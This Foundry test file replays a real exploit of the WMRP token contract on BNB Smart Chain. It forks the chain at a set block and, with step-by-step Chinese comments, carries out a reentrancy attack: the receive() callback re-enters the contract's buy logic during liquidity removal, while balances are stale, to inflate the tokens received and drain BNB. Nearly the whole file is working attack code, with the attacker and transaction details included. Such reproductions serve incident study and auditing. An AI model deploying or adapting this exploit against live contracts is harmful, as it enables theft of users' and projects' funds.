// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.0;
import "forge-std/Test.sol";
import "./interface/cheat.sol";
import "./interface/IWETH9.sol";
import "./interface/IERC20.sol";

// Total Lost: 17.9 BNB
// Chain: BSC
// Attacker: 0x132D9bbDBE718365aF6Cc9e43bac109A9A53B138
// Attack Contract: 0x2Bd8980A925E6f5a910be8Cc0Ad1CfF663E62d9D
// Attack Tx: https://bscscan.com/tx/0x4353a6d37e95a0844f511f0ea9300ef3081130b24f0cf7a4bd1cae26ec393101
// Vulnerable Contract: https://bscscan.com/token/0x35f5cef517317694df8c50c894080caa8c92af7d#code

interface IWMRP is IERC20 {
    function getAddLiquidityTrigger(
        address account
    ) external view returns (bool);

    function getContractEthAmount() external view returns (uint256);
}

contract WMRP_exp is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 MRP = IERC20(0xA0Ba9d82014B33137B195b5753F3BC8Bf15700a3);
    IWMRP WMRP = IWMRP(0x35F5cEf517317694DF8c50C894080caA8c92AF7D);

    function setUp() public {
        cheats.createSelectFork("bsc", 40122169);
    }

    function testExp() public {
        emit log_named_decimal_uint(
            "[Begin] Attacker BNB before exploit",
            address(this).balance,
            18
        );
        multicall();
        emit log_named_decimal_uint(
            "[End] Attacker BNB before exploit",
            address(this).balance,
            18
        );
    }

    function multicall() internal {
        // address(WMRP).call{value: 43.14 ether}("");
        emit log_named_decimal_uint(
            "[++++] BNB of contract",
            address(WMRP).balance,
            18
        );
        emit log_named_decimal_uint(
            "[++++] WMRP of contract",
            WMRP.balanceOf(address(WMRP)),
            18
        );
        // 0. 闪电贷获得 WBNB，换成 BNB
        // 由于本账号本身有大量的BNB，所以省却第一步

        // 1. 先给 WMRP合约转 BNB，触发买币操作
        address(WMRP).call{value: 43.14 ether}("");
        emit log_string("+++++++++++++++++++");
        emit log_named_decimal_uint(
            "[----1] BNB of this",
            address(this).balance,
            18
        );
        emit log_named_decimal_uint(
            "[----1] MRP of this",
            MRP.balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "[----1] WMRP of this",
            WMRP.balanceOf(address(this)),
            18
        );

        // 2. 再调用 WMRP合约的 transfer方法，给合约转 value为0，将用户添加到用户流动性名单中
        WMRP.transfer(address(WMRP), 0);
        uint isTrigger = 0;

        if (WMRP.getAddLiquidityTrigger(address(this))) {
            isTrigger = 1;
        }
        emit log_named_uint(
            "[++++] This address is in addLiquidityTrigger",
            isTrigger
        );

        // 3. 调用 MRP的transfer方法，如果to地址是合约，且是WMRP合约，则给WMRP合约转账，
        // 并调用 WMRP 的 handle接口触发 WMRP的 handle方法，在 handle方法中如果 amount不为0，将 MRP换成 WMRP（该步骤必须在2之后）
        MRP.transfer(address(WMRP), MRP.balanceOf(address(this)));
        emit log_string("+++++++++++++++++++");
        emit log_named_decimal_uint(
            "[----3] BNB of this",
            address(this).balance,
            18
        );
        emit log_named_decimal_uint(
            "[----3] MRP of this",
            MRP.balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "[----3] WMRP of this",
            WMRP.balanceOf(address(this)),
            18
        );

        // 4. 给 WMRP合约转 BNB，触发添加流动性操作，获得 lp（该步骤必须在3之后，否则会因为没有WMRP而revert）
        address(WMRP).call{value: 58 ether}("");
        emit log_string("+++++++++++++++++++");
        emit log_named_decimal_uint(
            "[----4] BNB of this",
            address(this).balance,
            18
        );
        emit log_named_decimal_uint(
            "[----4] MRP of this",
            MRP.balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "[----4] WMRP of this",
            WMRP.balanceOf(address(this)),
            18
        );

        // 5. 调用 WMRP合约的 transfer方法，给自己转 value为0，判定为移除流动性
        // 移除流动性时，合约会先给自己转BNB，此时触发本合约的 fallback函数（此时在回调函数中如果进行Buy买币，则会导致买的币比实际的多）
        WMRP.transfer(address(this), 0);

        // 7. 调用 MRP的transfer方法，如果to地址是合约，且是触发器WMRP，则给to合约转账，并调用 WMRP 的handle接口，将 MRP转换为 WMRP
        MRP.transfer(address(WMRP), 1268 ether);
        emit log_string("+++++++++++++++++++");
        emit log_named_decimal_uint(
            "[----7] BNB of this",
            address(this).balance,
            18
        );
        emit log_named_decimal_uint(
            "[----7] MRP of this",
            MRP.balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "[----7] WMRP of this",
            WMRP.balanceOf(address(this)),
            18
        );

        // 8. 调用 WMRP合约的 transfer方法，给合约转 value不为0，判定为卖币
        // 但是实际使用下面的getContractEthAmount可以获取到计算时合约的eth数量为37（真实余额为66），所以不能用WMRP sell卖币的方式获利
        emit log_string("+++++++++++++++++++");
        emit log_named_decimal_uint(
            "[----8] getContractEthAmount of WMRP",
            WMRP.getContractEthAmount(),
            18
        );

        emit log_named_decimal_uint(
            "[----8] MRP of MRP",
            MRP.balanceOf(address(MRP)),
            18
        );
        emit log_named_decimal_uint(
            "[----8] Eth of MRP",
            address(MRP).balance,
            18
        );
        // 9. 剩下的 MRP 换成 BNB 获利
        MRP.transfer(address(MRP), MRP.balanceOf(address(this)));
        emit log_string("+++++++++++++++++++");
        emit log_named_decimal_uint(
            "[----9] BNB of this",
            address(this).balance,
            18
        );
        emit log_named_decimal_uint(
            "[----9] MRP of this",
            MRP.balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "[----9] WMRP of this",
            WMRP.balanceOf(address(this)),
            18
        );
    }

    receive() external payable {
        // 6. fallback函数中，将BNB再转回到 WMRP合约，触发买币的业务逻辑，此时计算买币获得的 MRP数量
        // 由于销毁lp后先转的ETH，导致在上面式子中，bnb数量正确，但是合约的 WMRP的数量还未转走，导致该值大于实际值，最后导致buyAmount变多
        // 买币的过程中，合约先将 WMRP转给用户，又将用户的 WMRP销毁，转入等量的 MRP
        if (msg.value > 50 ether && msg.value < 80 ether) {
            address(WMRP).call{value: 58 ether}("");
        }

        emit log_string("+++++++++++++++++++");
        emit log_named_decimal_uint(
            "[----6] BNB of this",
            address(this).balance,
            18
        );
        emit log_named_decimal_uint(
            "[----6] MRP of this",
            MRP.balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "[----6] WMRP of this",
            WMRP.balanceOf(address(this)),
            18
        );
    }

    function on314Swaper() public returns (bytes4) {
        bytes4 selector = bytes4(msg.data);
        if (selector == 0x1457b0ed) {
            return 0x0000000;
        }
        revert("no such function");
    }
}
